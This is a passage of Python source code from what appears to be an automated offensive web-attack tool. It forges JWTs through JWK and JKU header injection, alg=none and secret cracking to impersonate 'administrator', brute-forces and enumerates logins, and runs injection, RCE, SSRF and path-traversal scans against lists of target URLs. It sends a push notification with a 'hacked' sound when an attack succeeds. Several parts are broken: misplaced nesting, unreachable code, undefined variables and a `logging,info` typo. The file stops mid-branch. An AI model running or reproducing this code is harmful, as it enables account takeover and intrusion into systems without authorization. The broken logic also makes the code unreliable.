async def login_with_jwt_comparison(login_url, jwt_token, token_owner, outputs):
    """
    Compare the /login page content with and without the JWT token.
    If the lengths of the content are not equal, the token has worked.
    """

    async with aiohttp.ClientSession() as session:
        # Step 1: Fetch the login page without any credentials (pre-login state)
        logging.info(f"(+) Fetching login page without credentials at {login_url}")
        pre_login_length, pre_login_content = await fetch_page_content(session, login_url)

        if pre_login_length is None:
            logging.error("(-) Failed to fetch the login page pre-login.")
            return False

        logging.info(f"(+) Length of /login page pre-login (no credentials): {pre_login_length}")

        # Step 2: Fetch the login page again, this time using the JWT token
        headers = {
            'Authorization': f'Bearer {jwt_token}'  # Option 1: Send JWT as Bearer token in headers
        }
        cookies = {
            'session': jwt_token  # Option 2: Send JWT as session cookie
        }

        logging.info(f"(+) Fetching login page with JWT token at {login_url}")
        post_login_length, post_login_content = await fetch_page_content(session, login_url, headers=headers, cookies=cookies)

        if post_login_length is None:
            logging.error("(-) Failed to fetch the login page with JWT.")
            return False

        logging.info(f"(+) Length of /login page with JWT token: {post_login_length}")

        # Step 3: Compare the lengths of the page content
        if pre_login_length != post_login_length:
            logging.info(f"(+) The page lengths are different. JWT token worked. {jwt_token}")
            with open(f"{outputs}/attacks/{token_owner}_jwt_token.txt", "a") as file:
                file.write(f"{jwt_token}\n")
            await send_pushover_notification(f"JWT Token confirmed {jwt_token}", sound_key='hacked')
            time.sleep(5)
            return True
        else:
            logging.info("(-) The page lengths are the same. JWT token did not work.")
            return False



# Perform the JWT bypass via JWK header injection
async def jwt_bypass_jwk_injection(url, token, outputs):
    #token = extract_jwt_from_set_cookie(token)
    # Step 1: Decode the JWT without verifying it
    decoded_token = jwt.decode(token, options={"verify_signature": False})
    decoded_header = jwt.get_unverified_header(token)
    logging.info(f"(+) Decoded token: {decoded_token}")
    logging.info(f"(+) Decoded header: {decoded_header}\n")

    # Step 2: Modify the token payload to escalate privileges
    decoded_token['sub'] = 'administrator'
    logging.info(f"(+) Modified token: {decoded_token}\n")

    # Step 3: Generate a new RSA key pair
    private_key_pem, e_b64, n_b64 = generate_rsa_key_pair()

    # Step 4: Build the JWK header with the public key
    jwk = {
        "kty": "RSA",
        "e": e_b64,
        "n": n_b64
    }

    # Step 5: Sign the modified JWT using the private key and embed the JWK in the header
    modified_token = jwt.encode(decoded_token, private_key_pem, algorithm='RS256', headers={'jwk': jwk})

    logging.info(f"(+) Modified JWT with JWK header: {modified_token}\n")

    # Step 6: Use the modified token in an attempt to access the admin panel and delete Carlos
    logging.info("(+) Attempting to access the admin panel with the modified JWT...")

    login_success = await login_with_jwt_comparison(url, modified_token,'administrator', outputs)

    if login_success:
        logging.info("(+) JWT token successfully logged in.")
    else:
        logging.error("(-) JWT token login failed.")

async def jku_header_injection(url, attack_server, token, outputs):
    #token = extract_jwt_from_set_cookie(token)
    # Step 1: Generate a new RSA key pair
    logging.info("(+) Generating a new RSA key pair for JKU header injection...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    # Export the public key from the private key
    public_key = private_key.public_key()
    public_numbers = public_key.public_numbers()

    # Step 2: Decode the original JWT without verifying
    decoded_token = jwt.decode(token, options={"verify_signature": False})
    decoded_header = jwt.get_unverified_header(token)
    logging.info(f"Decoded token:\n{json.dumps(decoded_token, indent=4)}\n")
    logging.info(f"Decoded header:\n{json.dumps(decoded_header, indent=4)}\n")

    # Build the JWK
    jwk = {
        "kty": "RSA",
        "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
        "kid": decoded_header['kid'],
        "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
    }



    # Step 3: Modify the token (JWT manipulation)
    decoded_token['sub'] = 'administrator'
    logging.info(f"Modified token:\n{json.dumps(decoded_token, indent=4)}\n")

    # Step 4: Sign the modified JWT using the private key
    jku_url = attack_server  # Insert your desired malicious JKU URL
    modified_token = jwt.encode(
        decoded_token,
        private_key,
        algorithm="RS256",
        headers={'jku': jku_url, 'kid': jwk['kid']}
    )

    keys = {"keys":[jwk]}
    logging.info(f"JWK:\n{json.dumps(keys, indent=4)}\n")

    # Step 5: Print the modified JWT and attempt to access the admin panel
    logging.info(f"Modified JWT with JKU header:\n{modified_token}\n")

    # Step 6: Use the modified token to attempt accessing the admin panel
    logging.info("(+) Attempting to access the admin panel with the modified JWT...")
    login_success = await login_with_jwt_comparison(url, modified_token, 'administrator', outputs)

    if login_success:
        logging.info("(+) JWT token successfully logged in.")
    else:
        logging.error("(-) JWT token login failed.")



# JWT Bypass via secret cracking and re-signing
async def bypass_flawed_signature_verification(url, cookie, wordlist_file, outputs):
    async def attempt_fuzzing(secret_key, algorithm):
        """Attempt to decode the JWT using a provided secret key."""
        try:
            # Extract JWT from the token
            token = extract_jwt_from_set_cookie(cookie)
            # Decode the token
            decoded = jwt.decode(token.encode('utf-8'), secret_key, algorithms=[algorithm])
            logging.info(f"(+) Valid key found: {secret_key}")
            logging.info(f"(+) Decoded payload: {decoded}")
            return True, secret_key, decoded
        except jwt.InvalidSignatureError:
            return False, None, None
        except Exception as e:
            logging.info(f"(-) Error during fuzzing: {e}")
            # Skip fuzzing if PEM error occurs
            if "PEM" in str(e):
                logging.info("(-) PEM file error encountered, skipping fuzzing and attempting a simpler bypass...")
                return "skip_fuzzing", None, None
            return False, None, None


        async def fuzz_secret_key(wordlist_file):
            """Brute-force the secret key using a wordlist."""
            with open(wordlist_file, 'r') as file:
                header = jwt.get_unverified_header(token.encode('utf-8'))
                algorithm = header.get("alg")
                if not algorithm:
                    logging.info("(-) Algorithm not found in JWT header.")
                    return None, None
                else:
                    logging.info(f"(+) Algorithm: {algorithm}")

                for secret_key in file:
                    secret_key = secret_key.strip()  # Clean up whitespace/newline
                    valid, found_key, payload = await attempt_fuzzing(secret_key, algorithm)
                    if valid == "skip_fuzzing":
                        return "skip_fuzzing", None
                    elif valid:
                        return found_key, payload
        return None, None

        # Start fuzzing the secret key
        logging.info("(+) Attempting to crack JWT secret...")
        found_key, payload = await fuzz_secret_key(wordlist_file)

        # If fuzzing was skipped or no valid secret key was found, try simpler bypass
        if found_key == "skip_fuzzing" or not found_key:
            logging.info("(-) No valid secret key found or fuzzing was skipped. Attempting simpler bypass with alg=none.")

            # Split JWT into header, payload, and signature
            header, payload, signature = token.split('.')

        # Decode the payload (base64 -> bytes -> string -> dict)
        decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
        payload_dict = json.loads(decoded_payload.decode())

        # Modify the payload to escalate privileges
        payload_dict['sub'] = 'administrator'
        logging.info(f"(+) Modified payload: {json.dumps(payload_dict, indent=4)}")

        # Re-encode the modified payload (Base64 URL encoding)
        modified_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b'=').decode()

        # Modify the header to set "alg" to "none"
        header_dict = json.loads(base64.urlsafe_b64decode(header + '=' * (-len(header) % 4)).decode())
        header_dict['alg'] = 'none'
        modified_header_b64 = base64.urlsafe_b64encode(json.dumps(header_dict).encode()).rstrip(b'=').decode()

        # Create the modified token (header.payload.) - no signature
        modified_token = f"{modified_header_b64}.{modified_payload_b64}."
        logging.info(f"(+) Modified JWT token (alg=none): {modified_token}\n")

        login_success = await login_with_jwt_comparison(url, modified_token, 'administrator', outputs)

        if login_success:
            logging.info("(+) JWT token successfully logged in.")
            logging.info(f"(+) Secret key found: {found_key}")
        else:
            logging.error("(-) JWT token login failed.")



            # Modify the payload to escalate privileges
            payload['sub'] = 'administrator'
            logging.info(f"(+) Modified payload: {json.dumps(payload, indent=4)}")

            # Re-sign the JWT with the cracked secret key
            header = jwt.get_unverified_header(token.encode('utf-8'))
            new_jwt_token = jwt.encode(payload, found_key, algorithm=header['alg'])

        logging.info(f"(+) Modified and re-signed JWT: {new_jwt_token}")

        login_success = await login_with_jwt_comparison(url, new_jwt_token, 'administrator', outputs)

        if login_success:
            logging.info("(+) JWT token successfully logged in.")
        else:
            logging.error("(-) JWT token login failed.")


# Function to brute-force passwords for a given username
async def narrow_down_password(url, username, passwords, outputs):
    """Try a range of passwords for a given username, including CSRF token."""
    for password in passwords:
        result = await login(url, username, password)
        if result:  # Check if the login attempt was successful
            username, password, jwt_token = result
            logging.info(f"Valid password found for {username}: {password}")
            await save_credentials_to_file(username, password, outputs)
            return username, password, jwt_token  # Return JWT immediately after finding the valid password
        else:
            logging.info(f"(-) Password {password} failed for user {username}.")
    return None, None, None

# Full attack sequence combining enumeration and password brute-forcing
async def brute_force_all_users_passwords(url, usernames, passwords, outputs):
    """Brute-force usernames and passwords."""
    for username in usernames:
        username, password, jwt_token = await narrow_down_password(url, username, passwords, outputs)
        if password:
            await save_credentials_to_file(username, password, outputs)
            return username, password, jwt_token  # Exit brute force immediately after finding valid credentials
    logging.error("(-) Brute force failed to find valid credentials.")
    return None, None, None

# Function to extract error messages from the response
def extract_error_message(response_text):
    """Extract and return error messages from the response."""
    soup = BeautifulSoup(response_text, 'html.parser')

    # Find and extract the error message or surrounding context
    error_message = soup.find(string="Invalid username or password.")

    # Return the exact error message or fallback to first 500 chars if not found
    if error_message:
        return error_message.strip()
    return soup.get_text()[:500]  # Fallback: Return first 500 chars if not found

# Function to brute-force usernames with a static password (basic username enumeration)
async def brute_force_username(url, usernames, static_password, outputs):
    """Brute-force usernames with a static password."""
    logging.info("(+) Scraping baseline response for an invalid login attempt...")

    # Baseline request to get a standard response
    baseline_response = await login(url, 'invalid_user', static_password)

    baseline_message = extract_error_message(baseline_response.text)
    baseline_length = len(baseline_response.text)

    logging.info(f"(+) Baseline error message: '{baseline_message}'")
    logging.info(f"(+) Baseline response length: {baseline_length}")

    # Iterate over the usernames and submit login attempts
    for username in usernames:
        # Extract the current response message and length
        current_response = await login(url, username, static_password)
        current_message = extract_error_message(current_response.text)
        current_length = len(current_response.text)

        logging.info(f"Testing username: {username} | Response length: ({baseline_length} : {current_length})")

        # Check if error message indicates an incorrect password (valid username)
        if "incorrect password" in current_message.lower() and baseline_length != current_length:
            logging.info(f"Valid username found based on error message: {username}")
            username, password, jwt_token = await narrow_down_password(url, username, 'FakePass', outputs)
            await save_credentials_to_file(username, password, outputs)
            return username, password, jwt_token

        # Check for subtle differences in response message or length
        elif baseline_message != current_message:
            logging.info(f"Valid username found based on subtle difference: {username}")
            username, password, jwt_token = await narrow_down_password(url, username, 'FakePass', outputs)
            await save_credentials_to_file(username, password, outputs)
            return username, password, jwt_token
        else:
            logging.info(f"Tried {username}, not valid.")

    return None, None, None




async def Auth_Aussalt(valid_user, valid_password, attack_server, outputs, url_list, password_list, users_list):
    logging.info(f"(+) User input: {valid_user[0]} | {valid_password[0] if valid_password else 'None'}")

    content = await read_file(url_list)
    urls = content.splitlines()
    content = await read_file(password_list)
    password_list = content.splitlines()
    content = await read_file(users_list)
    users_list = content.splitlines()

    logging.debug(f"Loaded {len(urls)} URL from file.")
    logging.debug(f"Loaded {len(password_list)} passwords from file.")
    logging.debug(f"Loaded {len(users_list)} usernames from file.")


    # Continue until we have both a valid user and a valid password
    while not valid_password[0] or not valid_user[0]:
        # Iterate through each URL in the list
        for url in urls:
            try:
                # If only the user is valid, brute force the password
                if valid_user[0] and not valid_password[0]:
                    logging.info("Only user is valid, brute-forcing password.")
                    username, password, jwt_token = await narrow_down_password(url, valid_user[0], password_list, outputs)
                # If only the password is valid, brute force the username
                elif valid_password[0] and not valid_user[0]:
                    logging.info("Only password is valid, brute-forcing user.")
                    username, password, jwt_token = await brute_force_username(url, users_list, valid_password[0], outputs)
                # If neither user nor password is valid, brute force both
                elif not valid_password[0] and not valid_user[0]:
                    logging.info("User & password are invalid, brute-forcing all users and passwords.")
                    username, password, jwt_token = await brute_force_all_users_passwords(url, users_list, password_list, outputs)
                # If both user and password are provided, try to log in
                elif valid_user[0] and valid_password[0]:
                    logging.info("Both user and password are provided and non-empty. Proceeding with login.")
                    username, password, jwt_token = await login(url, valid_user[0], valid_password[0])
                else:
                    logging.error("(-) No valid credentials provided.")
                    continue

                # If login is successful, update valid_user and valid_password
                if jwt_token:
                    valid_user[0] = username
                    valid_password[0] = password
                    logging.info(f"(+) Successful login with user: {username} and password: {password}")
                    # Proceed with JWT-based attack if valid credentials are found
                    await asyncio.gather(
                        bypass_flawed_signature_verification(url, jwt_token, outputs),
                        jwt_bypass_jwk_injection(url, jwt_token, outputs),
                        jku_header_injection(url, attack_server, jwt_token, outputs)
                    )
                    # Do not exit loop; continue to handle other tasks
                else:
                    logging.warning(f"(-) Failed login attempt for URL: {url}")

            # Handle exceptions that may occur during the await calls
            except Exception as e:
                logging.error(f"(x) Exception occurred while processing URL: {url} - {str(e)}")
                continue  # Move to the next URL in case of an error


# Function to load URLs from file
def load_urls(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

# Helper function to save results to a file
def save_result(outputs_path, filename, message):
    with open(f"{outputs_path}/{filename}", "a") as file:
        file.write(f"{message}\n")




# Function to load payloads from file
def load_payloads(file_path):
    payloads = []
    with open(file_path, 'r') as f:
        for line in f:
            line = line.strip()  # Remove any extraneous whitespace
            if line and not line.startswith('#'):  # Ignore comments
                payloads.append(str(line))  # Ensure the payload is treated as a string
    return payloads

# Function to check for potential XSS execution based on response length
async def check_xss_response(session, url, payload):
    try:
        # Send the original request without payload to get the baseline response size
        async with session.get(url) as baseline_response:
            baseline_text = await baseline_response.text()
            baseline_length = len(baseline_text)
            logging.info(f"Baseline length for {url}: {baseline_length} bytes")

        # Send the request with the XSS payload
        async with session.get(f"{url}{quote(payload)}") as response:
            text_with_payload = await response.text()
            payload_length = len(str(text_with_payload))
            logging.info(f"Payload response length for {url}: {payload_length} bytes")

            soup = BeautifulSoup(text_with_payload.lower, 'html.parser')
            # Compare response lengths
            if response.status == 200 and payload.lower in soup.text:
                logging.info(f"XSS payload reflected in response text at {url} with payload {payload}")
                return f"VULNERABLE (XSS - Reflected Content): {url} with payload {payload}"

    except Exception as e:
        logging.error(f"Error checking {url} with payload {payload}: {e}")
    return None

async def Bane_brute(url_list, valid_password, valid_user, password_list, users_list, outputs_path):

    users_list = load_payloads(users_list)
    password_list = load_payloads(password_list)
    urls = load_payloads(url_list)
    if valid_user:
        users_list = valid_user
    if valid_password:
        password_list = valid_password

    for url in urls:

        Admin_Panel_Finder = Admin_Panel_Finder(url, headers=await get_spoofed_headers(), http_proxies=proxies)
        Files_Manager_Finder = Files_Manager_Finder(url, headers=await get_spoofed_headers(), http_proxies=proxies)

        for users in users_list:
            for passwd in password_list:
                #Force_Browsing(url, headers=await get_spoofed_headers(), http_proxies=proxies)
                HTTP_Auth_Bruteforce = HTTP_Auth_Bruteforce(url, word_list=[users,passwd], headers=await get_spoofed_headers(), http_proxies=proxies)

        '''

        extract_jwt_from_set_cookie()
        #Analyze a JWT token
        token_info = JWT_Manager.analyze_token("your_jwt_token_here")

        #Guess the secret key used for a JWT token
        guessed_key = JWT_Manager.guess_secret_key(password_list, "your_jwt_token_here")

        #Encode data into a JWT token
        encoded_token = JWT_Manager.encode({"user_id":  "administrator"}, guessed_key)

        #Decode a JWT token
        decoded_data = JWT_Manager.decode("your_jwt_token_here", guessed_key)
        '''

        #Admin panel search is performed in the background
        #You can check the status with admin_finder.done()
        while not Admin_Panel_Finder.done():
            time.sleep(5)

        #Access the result
        Admin_Panel_Finder_result = Admin_Panel_Finder.result
        logging,info("Admin Panel URLs:", Admin_Panel_Finder_result)

        #File/resource search is performed in the background
        #You can check the status with finder.done()
        while not Files_Manager_Finder.done():
            time.sleep(5)

        #Access the result
        Files_Manager_Finder_result = Files_Manager_Finder.result
        logging.info("File/Resource Found:", Files_Manager_Finder_result)

        #HTTP authentication bruteforce attack is performed in the background
        #You can check the status with auth_bruteforce.done()
        while not HTTP_Auth_Bruteforce.done():
            time.sleep(1)

        #Access the result
        HTTP_Auth_Bruteforce_result = HTTP_Auth_Bruteforce.result
        logging.info("auth_bruteforce Result:", HTTP_Auth_Bruteforce_result)





        #saving resuls
        save_result(outputs_path, "recon/Admin_Panel_Finder_result.txt", Admin_Panel_Finder_result)
        save_result(outputs_path, "recon/Files_Manager_Finder_result.txt", Files_Manager_Finder_result)
        save_result(outputs_path, "attacks/HTTP_Auth_Bruteforce_result.txt", HTTP_Auth_Bruteforce_result)


    return None

# Core injection testing function
async def injection_attacks(url_list, xss_payloads_file, sqli_payloads_file, cmd_injection_payloads_file, template_injection_payloads_file, outputs):
    # SSL context for secure requests
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    ssl_context.options |= ssl.OP_NO_TLSv1_3  # Optional: Disable TLS 1.3 if needed
    ssl_context.options |= ssl.OP_NO_SSLv3    # Disable SSLv3 for stronger security

    # Timeout settings for aiohttp
    timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=10, sock_connect=10)

    # Load payloads and URLs from files
    xss_payloads = load_payloads(xss_payloads_file)
    sqli_payloads = load_payloads(sqli_payloads_file)
    cmd_injection_payloads = load_payloads(cmd_injection_payloads_file)
    template_injection_payloads = load_payloads(template_injection_payloads_file)
    urls = load_payloads(url_list)

    # Dictionary to store payload types
    payload_types = {
        'XSS': xss_payloads,
        'SQL Injection': sqli_payloads,
        'Command Injection': cmd_injection_payloads,
        'Template Injection': template_injection_payloads
    }

    rstrings = await generate_random_string(12)

    for url in urls:

        #SSTIresult = SSTI_Scanner.scan(url, save_to_file=f'{outputs}/attacks/SSTI_Success.txt', headers=await get_spoofed_headers(), http_proxies=proxies)
        SSRFresult = SSRF_Scanner.scan(url, headers=await get_spoofed_headers(), http_proxies=proxies)
        XSSresult = XSS_Scanner.scan(url, headers=await get_spoofed_headers(), http_proxies=proxies)
        #Perform the RCE scan
        RCEresult = RCE_Scanner.scan(url, save_to_file=f'{outputs}/attacks/RCE_Success_{rstrings}.txt', headers=await get_spoofed_headers(), http_proxies=proxies)
        #Perform the Path Traversal vulnerability scan
        Path_Traversalresults = Path_Traversal_Scanner.scan(url, headers=await get_spoofed_headers(), http_proxies=proxies)
        #Perform a scan for file upload vulnerabilities
        File_Uploadresults = File_Upload_Scanner.scan(url, headers=await get_spoofed_headers(), http_proxies=proxies)

        Mixed_Contentresult = Mixed_Content_Scanner.scan(url, headers=await get_spoofed_headers(), http_proxies=proxies)
        Backedresult = Backend_Technologies_Scanner.scan(url, headers=await get_spoofed_headers(), http_proxies=proxies)
        '''
        #Display the scan results
        for result in SSTIresult:
            logging.info("Scan Result: ", result)
        '''
        #Access the scan results
        for page in SSRFresult:
            logging.info(f"Scanning page: {page['page']}")
            for vulnerable_url in page['result']:
                logging.info(f"Vulnerable URL: {vulnerable_url}")



        for result in XSSresult:
            payload = result["Payload"]
            message = f'Vulnerable Fields  url : {url} \n XSS {payload}'
            logging.info(message)
            logging.info("Form: " + result["form"])
            logging.info("Method: " + result["method"])
            logging.info("Vulnerable Fields: " + str(result["vulnerable"]))
            logging.info("\n")
            await send_pushover_notification(message, sound_key='hacked')
            success_detected = True


        #Access and process the scan result
        for result in RCEresult:
            logging.info("Scan Result for Page:", result['page'])
            for form in result['result']:
                logging.info("Form Action:", form['action'])
                logging.info("Method:", form['method'])
                for vuln in form['vulnerable']:
                    logging.info("Vulnerable Parameter:", vuln['parameter'])
                    logging.info("Context:", vuln['context'])

        #Display the scan results
        for result in Path_Traversalresults:
            logging.info("Page:", result["page"])
            for url_result in result["result"]:
                logging.info("Vulnerable URL:", url_result)


        #Display the scan results
        for result in File_Uploadresults:
            logging.info("Page:", result['page'])
            for form_result in result['result']:
                logging.info("Form:", form_result['form'])
                logging.info("Vulnerable:", form_result['vulnerable'])
                logging.info("Status:", form_result['status'])

        #Access the scan result, which contains vulnerable URLs
        for site in Mixed_Contentresult:
            logging.info("Vulnerable URL:", site)


        for result in Backedresult:
            message = f'Vulnerable Fields  url : {url} \n BackEnd '
            logging.info(message)
            #Access the scan results
            shodan_report = scan_result['shodan_report']
            server_exploits = scan_result['server_exploits']
            backend_technology_exploits = scan_result['backend_technology_exploits']

            #Print or process the results as needed
            logging.info("Shodan Report:", shodan_report)
            logging.info("Server Exploits:", server_exploits)
            logging.info("Backend Technology Exploits:", backend_technology_exploits)

            #await send_pushover_notification(message, sound_key='hacked')
            success_detected = True


async def CMS_scans(url_list, outputs_path):
    urls = load_payloads(url_list)
    rstrings = await generate_random_string(12)
    for url in urls:
        #Scanning CMS
        Drupal_result = Drupal_Scanner.scan(url, headers=await get_spoofed_headers(), http_proxies=proxies)
        Joomla_result = Joomla_Scanner.scan(url, headers=await get_spoofed_headers(), http_proxies=proxies)
        Magento_result = Magento_Scanner.scan(url, headers=await get_spoofed_headers(), http_proxies=proxies)
        WordPress_result = WordPress_Scanner.scan(url, headers=await get_spoofed_headers(), http_proxies=proxies)

        #Logging Scans
        logging.info(Drupal_result)
        logging.info(Joomla_result)
        logging.info(Magento_result)
        logging.info(WordPress_result)

        #saving resuls
        save_result(outputs_path, f"scan/Drupal_result_{rstrings}.txt", Drupal_result)
        save_result(outputs_path, f"scan/Joomla_result._{rstrings}txt", Joomla_result)
        save_result(outputs_path, f"scan/Magento_result._{rstrings}txt", Magento_result)
        save_result(outputs_path, f"scan/WordPress_result._{rstrings}txt", WordPress_result)


    return None

async def target_urls(url_list, details, dirlist, sublist, paralist, tor, ffuf2burp, speed, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, outputs, output_queue, log_file):
    # Load URLs from file, filter out those starting with '127.0.0.1' to avoid local addresses
    with open(url_list, 'r') as file:
        url_list = [url.strip() for url in file.readlines() if not url.startswith("127.0.0.1")]

    # Iterate over each URL and attempt connections
    for url in url_list:
        # Prepare HTTP and HTTPS versions of the URL
        modified_url_http = f"http://{url}"
        modified_url_https = f"https://{url}"
        connection_successful = False
        successful_urls = []
        connection_successful = False
        scheme = None
        url_http = None

        # Attempt HTTP connection without SSL verification
        try:
            logging.info(f"Attempting to connect to {modified_url_http} without SSL")
            # Create a connector that ignores SSL to avoid certification validation issues for HTTP
            connector = aiohttp.TCPConnector(ssl=False)
            # Start an HTTP session with the created connector
            async with aiohttp.ClientSession(connector=connector) as session:
                # Attempt to GET the modified URL through an HTTP proxy
                async with session.get(modified_url_http, proxy='http://127.0.0.1:8080', allow_redirects=False) as response:
                    # Only count status code 200 as successful to avoid false positives
                    if response.status == 200:
                        logging.info(f"Connection successful to {modified_url_http}")
                        successful_urls.append(modified_url_http)
                        connection_successful = True
                        scheme = 'http'
                        url_http = modified_url_http
                        # If a connection was successfully made, proceed to enumeration
                        if connection_successful:
                            await enumeration_stage(url_http, url, dirlist, sublist, paralist, tor, ffuf2burp, f"{outputs}/recon/URL.log", speed, outputs, output_queue, log_file, scheme)
                            await Processes_URLS(f"{outputs}/recon/URL.log", outputs)
                            logging.info('Processesing URLs')
                            await asyncio.gather(
                                injection_attacks(f"{outputs}/recon/URL.log", xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, outputs),
                                CMS_scans(f"{outputs}/recon/URL.log", outputs)
                            )

                        else:
                            logging.info(f"Failed to establish a connection to {modified_url_http}")
                    else:
                        logging.warning(f"Received non-successful status code {response.status} for {modified_url_http}")

        except aiohttp.ClientConnectorError as e:
            # Log specific connection errors (e.g., host unreachable)
            logging.error(f"Connection error without SSL for {modified_url_http}: {e}")
        except Exception as e:
            # Log any unexpected errors that might occur
            logging.error(f"Unexpected error during non-SSL connection attempt for {modified_url_http}: {e}")

        # Attempt HTTPS connection with SSL if HTTP connection fails
        if not connection_successful:
            try:
                logging.info(f"Attempting to connect to {modified_url_https} with SSL")
                # Create a connector with SSL enabled for HTTPS
                connector = aiohttp.TCPConnector(ssl=ssl.create_default_context())
                # Start an HTTPS session with the created connector
                async with aiohttp.ClientSession(connector=connector) as session:
                    # Attempt to GET the modified URL through an HTTP proxy
                    async with session.get(modified_url_https, proxy='http://127.0.0.1:8080', allow_redirects=False) as response:
                        # Only count status code 200 as successful to avoid false positives
                        if response.status == 200:
                            logging.info(f"Connection successful to {modified_url_https}")
                            successful_urls.append(modified_url_https)
                            connection_successful = True
                            scheme = 'https'
                            url_http = modified_url_https
                            # If a connection was successfully made, proceed to enumeration
                            if connection_successful:
                                await enumeration_stage(url_http, url, dirlist, sublist, paralist, tor, ffuf2burp, f"{outputs}/recon/URL.log", speed, outputs, output_queue, log_file, scheme)
                                await asyncio.gather(
                                    injection_attacks(f"{outputs}/recon/URL.log", xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, outputs),
                                    CMS_scans(f"{outputs}/recon/URL.log", outputs)
                                )
                                await Processes_URLS(f"{outputs}/recon/URL.log", outputs)
                                logging.info('Processesing URLs')
                            else:
                                logging.info(f"Failed to establish a connection to {modified_url_https}")
                        else:
                            logging.warning(f"Received non-successful status code {response.status} for {modified_url_https}")

            except aiohttp.ClientConnectorError as e:
                # Log specific connection errors for HTTPS
                logging.error(f"Connection error with SSL for {modified_url_https}: {e}")
            except ssl.SSLError as e:
                # Log SSL-specific errors (e.g., certificate verification failed)
                logging.error(f"SSL error for {modified_url_https}: {e}")
            except Exception as e:
                # Log any unexpected errors that might occur during the HTTPS connection attempt
                logging.error(f"Unexpected error during SSL connection attempt for {modified_url_https}: {e}")

        # Log all successful URLs after completing the iterations
        logging.info(f"Successful URLs: {successful_urls}")






# Main asyncio function
async def main(output_queue):
    prevailing_session = None
    http_IP = None

    try:
        logging.debug("Starting main function.")

        if len(sys.argv) >= 6:
            IP = sys.argv[1].strip()
            LV = int(sys.argv[2])
            # Convert LV only if it is a valid integer string
            try:
                LV = int(sys.argv[2].strip())
            except ValueError:
                logging.error("Invalid LV value provided as command-line argument. Defaulting LV to 1.")
                LV = 1
            valid_user = sys.argv[3].split(',')
            valid_password = sys.argv[4].split(',')
            attack_server = sys.argv[5].strip()
        else:
            print("Usage: python3 script_name.py <arg1> <arg2> <arg3> <arg4> <arg5>")
            IP = input("URL or IP: ").strip()
            LV_input = input("0-5: ").strip()
            if LV_input.isdigit():
                LV = int(LV_input)
            else:
                logging.error("Invalid LV input from user. Defaulting LV to 1.")
                LV = 1
            valid_user = input("USER (comma-separated list): ").split(',')
            valid_password = input("PASS (comma-separated list): ").split(',')
            attack_server = input("Attack Server: ").strip()



        # Set Speed, sublist and dirlist based on enumeration level
        if LV == 0:
            users_list, password_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, sublist, dirlist, paralist, speed, speed_option = ('/usr/share/wordlists/seclists/Usernames/users.txt', '/usr/share/wordlists/pass.txt', '/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/XSS-Fuzzing.txt', '/usr/share/wordlists/seclists/Fuzzing/SQLi/quick-SQLi.txt', '/usr/share/wordlists/seclists/Fuzzing/allCOMMANDS.txt', '/usr/share/wordlists/seclists/Fuzzing/allSSTI.txt', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt', '/usr/share/wordlists/paramlist/params.txt', '-t 30', '--max-rate=1000')
        elif LV == 1:
            users_list, password_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, sublist, dirlist, paralist, speed, speed_option = ('/usr/share/wordlists/seclists/Usernames/users.txt', '/usr/share/wordlists/pass.txt', '/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/XSS-Fuzzing.txt', '/usr/share/wordlists/seclists/Fuzzing/SQLi/quick-SQLi.txt', '/usr/share/wordlists/seclists/Fuzzing/allCOMMANDS.txt', '/usr/share/wordlists/seclists/Fuzzing/allSSTI.txt', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt','/usr/share/wordlists/paramlist/params.txt', '-t 60', '--min-rate=1000')
        elif LV == 2:
            users_list, password_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, sublist, dirlist, paralist, speed, speed_option = ('/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt', '/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt', '/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt', '/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt', '/usr/share/wordlists/seclists/Fuzzing/allCOMMANDS.txt', '/usr/share/wordlists/seclists/Fuzzing/allSSTI.txt', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt', '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt', '/usr/share/wordlists/paramlist/params.txt', '-t 30', '--max-rate=1000')
        elif LV == 3:
            users_list, password_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, sublist, dirlist, paralist, speed, speed_option = ('/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt', '/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt', '/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt', '/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt', '/usr/share/wordlists/seclists/Fuzzing/allCOMMANDS.txt', '/usr/share/wordlists/seclists/Fuzzing/allSSTI.txt', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt', '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt', '/usr/share/wordlists/paramlist/parameters.txt', '-t 60', '--min-rate=1000')
        elif LV == 4:
